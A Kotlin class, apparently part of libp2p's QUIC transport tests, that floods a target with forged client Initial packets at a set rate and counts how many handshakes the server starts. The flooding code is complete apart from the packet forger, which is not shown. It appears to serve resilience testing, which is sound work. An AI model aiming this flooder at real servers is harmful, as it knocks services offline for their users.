package io.libp2p.transport.quic.dos

import java.net.InetSocketAddress
import java.nio.ByteBuffer
import java.nio.channels.DatagramChannel
import java.util.concurrent.atomic.AtomicLong
import java.util.concurrent.locks.LockSupport

/**
 * Sends forged client Initials to [target], each with a fresh destination connection id, at [ratePps]
 * handshake attempts per second (0 = as fast as the sender threads can go).
 *
 * The attacker never answers: it only drains the server's replies to count how many distinct
 * handshakes the server actually started (one server source connection id per started handshake).
 */
class QuicHandshakeFlooder(
    private val target: InetSocketAddress,
    private val forger: () -> QuicInitialForger,
    private val ratePps: Int,
    private val senderThreads: Int = 1
) : AutoCloseable {

    val attemptsSent = AtomicLong()
    val bytesSent = AtomicLong()
    val sendErrors = AtomicLong()
    val repliesReceived = AtomicLong()
    val replyBytes = AtomicLong()
    val handshakesStarted = AtomicLong()

    @Volatile
    private var running = true
    private val channel: DatagramChannel = DatagramChannel.open().apply {
        setOption(java.net.StandardSocketOptions.SO_SNDBUF, 4 shl 20)
        setOption(java.net.StandardSocketOptions.SO_RCVBUF, 4 shl 20)
        bind(InetSocketAddress(target.address, 0))
        connect(target)
    }
    private val threads = mutableListOf<Thread>()

    fun start(): QuicHandshakeFlooder {
        val startNanos = System.nanoTime()
        val perThreadRate = ratePps.toDouble() / senderThreads
        repeat(senderThreads) { idx ->
            threads += Thread({ sendLoop(idx, startNanos, perThreadRate) }, "quic-flood-sender-$idx").apply {
                isDaemon = true
                start()
            }
        }
        threads += Thread(::drainLoop, "quic-flood-drain").apply {
            isDaemon = true
            start()
        }
        return this
    }

    private fun sendLoop(idx: Int, startNanos: Long, rate: Double) {
        val f = forger()
        val dcid = ByteArray(16)
        ByteBuffer.wrap(dcid).putLong(System.nanoTime()).putInt(idx)
        var counter = 0
        var sent = 0L
        val bb = ByteBuffer.wrap(dcid)
        while (running) {
            if (rate > 0) {
                val allowed = ((System.nanoTime() - startNanos) * rate / 1e9).toLong()
                if (sent >= allowed) {
                    LockSupport.parkNanos(20_000)
                    continue
                }
            }
            bb.putInt(12, counter++)
            for (datagram in f.forge(dcid)) {
                try {
                    channel.write(ByteBuffer.wrap(datagram))
                    bytesSent.addAndGet(datagram.size.toLong())
                } catch (e: Exception) {
                    // ECONNREFUSED etc. from a closed victim: keep going, like an attacker would
                    sendErrors.incrementAndGet()
                }
            }
            sent++
            attemptsSent.incrementAndGet()
        }
    }

    private fun drainLoop() {
        val buf = ByteBuffer.allocate(2048)
        val seenServerCids = HashSet<Long>()
        while (running) {
            buf.clear()
            try {
                if (channel.receive(buf) == null) continue
            } catch (e: Exception) {
                if (!running) return
                continue
            }
            repliesReceived.incrementAndGet()
            replyBytes.addAndGet(buf.position().toLong())
            val d = buf.array()
            if (d[0].toInt() and 0x80 == 0) continue
            // long header: flags(1) version(4) dcidLen(1) dcid scidLen(1) scid
            val dcidLen = d[5].toInt() and 0xff
            val scidLen = d[6 + dcidLen].toInt() and 0xff
            val scid = ByteBuffer.wrap(d, 7 + dcidLen, scidLen)
            var key = 0L
            repeat(minOf(8, scidLen)) { key = (key shl 8) or (scid.get().toLong() and 0xff) }
            if (seenServerCids.add(key)) handshakesStarted.incrementAndGet()
        }
    }

    override fun close() {
        running = false
        threads.filter { it.name.startsWith("quic-flood-sender") }.forEach { it.join(2000) }
        channel.close()
    }
}
